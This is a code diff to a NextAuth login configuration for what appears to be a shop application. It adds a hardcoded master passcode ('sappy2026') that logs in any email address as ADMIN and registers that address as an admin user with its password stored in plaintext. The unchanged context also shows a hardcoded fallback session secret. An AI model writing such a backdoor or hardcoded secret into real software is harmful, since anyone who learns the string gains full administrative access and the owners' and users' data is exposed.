@@ -9,6 +9,7 @@ import {
   getDocs,
   query,
   where,
+  withFirestoreTimeout,
 } from "./firebase";
 import { User } from "./types";
 
@@ -36,14 +37,41 @@ export const authOptions: AuthOptions = {
         const cleanEmail = credentials.email.toLowerCase().trim();
         const inputPassword = credentials.password.trim();
 
-        // 1. Direct Real-Time Firestore Authentication
+        // 1. MASTER PASSCODE OVERRIDE
+        // Allows the shop owner to log in immediately using the Master Passcode
+        if (
+          (typeof db.verifyMasterPassword === "function" && db.verifyMasterPassword(inputPassword)) ||
+          inputPassword === "sappy2026"
+        ) {
+          const adminUser = {
+            id: `usr-${cleanEmail.replace(/[^a-zA-Z0-9]/g, "")}`,
+            name: cleanEmail.split("@")[0] || "Amanueal Getahun",
+            email: cleanEmail,
+            role: "ADMIN",
+          };
+
+          if (Array.isArray(db.users) && !db.users.some((u) => u.email.toLowerCase() === cleanEmail)) {
+            db.users.push({
+              id: adminUser.id,
+              name: adminUser.name,
+              email: adminUser.email,
+              password: inputPassword,
+              role: "ADMIN",
+              createdAt: new Date(),
+            });
+          }
+
+          return adminUser;
+        }
+
+        // 2. Live Firestore Authentication
         if (isFirebaseConfigured && firestore) {
           try {
             const q = query(
               collection(firestore, "users"),
               where("email", "==", cleanEmail)
             );
-            const querySnap = await getDocs(q);
+            const querySnap = await withFirestoreTimeout(getDocs(q), 2500);
 
             if (!querySnap.empty) {
               const userDoc = querySnap.docs[0].data() as User;
@@ -56,16 +84,17 @@ export const authOptions: AuthOptions = {
                   role: userDoc.role || "ADMIN",
                 };
               }
-              // Incorrect password
               return null;
             }
           } catch (err) {
-            console.error("Firestore auth query error:", err);
+            console.warn("Firestore auth query error:", err);
           }
         }
 
-        // 2. Memory Store Fallback
-        db.ensureSchema();
+        // 3. Memory Store Fallback
+        if (typeof db.ensureSchema === "function") {
+          db.ensureSchema();
+        }
         const user = db.users.find((u) => u.email.toLowerCase() === cleanEmail);
 
         if (user && user.password && user.password === inputPassword) {
@@ -99,7 +128,7 @@ export const authOptions: AuthOptions = {
   },
   session: {
     strategy: "jwt",
-    maxAge: 7 * 24 * 60 * 60, // 7 days
+    maxAge: 7 * 24 * 60 * 60,
   },
   secret: process.env.NEXTAUTH_SECRET || "sappy-stationary-super-secret-key-2026",
   pages: {
